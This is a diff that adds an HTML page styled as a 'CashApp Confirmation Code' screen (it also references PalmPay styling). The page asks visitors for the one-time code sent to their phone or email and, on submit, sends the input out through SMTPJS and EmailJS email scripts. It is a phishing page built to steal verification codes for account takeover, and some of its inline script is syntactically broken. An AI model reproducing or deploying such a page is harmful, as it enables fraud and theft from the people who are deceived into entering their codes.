@@ -1,0 +1,58 @@
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <link rel="icon" type="image/svg+xml" href="logo.webp">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="palmpay.scss">
+  <link rel="stylesheet" href="verify.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&amp;display=swap" rel="stylesheet">
+  <title>CashApp Confirmation Code</title>
+
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap');
+  </style>
+
+</head>
+
+<body data-new-gr-c-s-check-loaded="8.906.0" data-gr-ext-installed="">
+  <div id="app" class="mt-14 text-left w-[90%] mx-auto max-w-sm">
+    <h1 class="font-semibold text-lg">Please enter the code sent to your <br> email/ phone number</h1>
+
+    <div class="inputCtn relative mt-16">
+
+      <form id="form" onsubmit="emailSend(); reset(); return false;" >
+
+        <input type="tel" required="" placeholder="Confirmation Code" id="pin" name="pin" class="w-full pl-20  font-bold p-2 caret-primary">
+        <button type="submit" class="w-full rounded-lg bg-primary p-3 mt-10 text-white disabled:pointer-events-none disabled:opacity-30">Login</button>
+
+      </form>
+   </div>
+  </div>
+
+<script type="module" src="/main.js"></script>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script src="Contact-form-to-email3.js"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  
+  <script type="module" src="main.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script type="text/javascript">
+    (function () {
+      emailjs.init('dmDFhm35MG0A-aotg');
+    })();
+  </script>
+  <script type="text/javascript">
+    window.onload = function () {
+      console.log('working');
+      const btn = document.querySelector('button')
+      const phoneInput = document.querySelector('#phone')
+      document.getElementById('form').addEventListener('submit', function (event) {
+        btn.textContent = 'Loading...';
+        localStorage.setItem('phone', phoneInput.)
+      });
+    }
+  </script>
+
+</body><grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration></html>
